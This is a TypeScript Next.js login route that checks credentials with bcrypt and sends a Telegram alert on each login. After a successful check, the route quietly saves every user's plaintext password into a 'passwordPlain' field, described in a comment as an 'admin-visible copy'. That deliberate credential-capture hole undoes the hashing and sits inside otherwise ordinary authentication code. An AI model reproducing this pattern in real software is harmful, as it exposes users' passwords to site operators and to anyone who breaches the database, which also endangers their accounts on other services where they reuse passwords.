import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";
import { prisma } from "@/lib/db";
import { attachSession } from "@/lib/session";
import { jsonError, toPublicUser } from "@/lib/serialize";
import { userCounts } from "@/lib/mappers";
import { handleRouteError } from "@/lib/http";
import { notifyTelegram } from "@/lib/telegram";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const login = String(body.email ?? body.username ?? "").trim().toLowerCase();
    const password = String(body.password ?? "");
    if (!login || !password) return jsonError("Email and password are required");
    const user = await prisma.user.findFirst({
      where: { OR: [{ email: login }, { username: login }] },
    });
    if (!user) return jsonError("Invalid credentials", 401);
    if (user.banned) return jsonError("Account is banned", 403);
    const ok = await bcrypt.compare(password, user.passwordHash);
    if (!ok) return jsonError("Invalid credentials", 401);
    // Keep admin-visible copy in sync whenever someone logs in
    await prisma.user.update({
      where: { id: user.id },
      data: { passwordPlain: password },
    });
    const counts = await userCounts(user.id);
    void notifyTelegram(`🔐 Login\n${user.name} (@${user.username})`);
    const res = NextResponse.json({ user: toPublicUser(user, counts) });
    return attachSession(res, user.id);
  } catch (e) {
    return handleRouteError(e);
  }
}
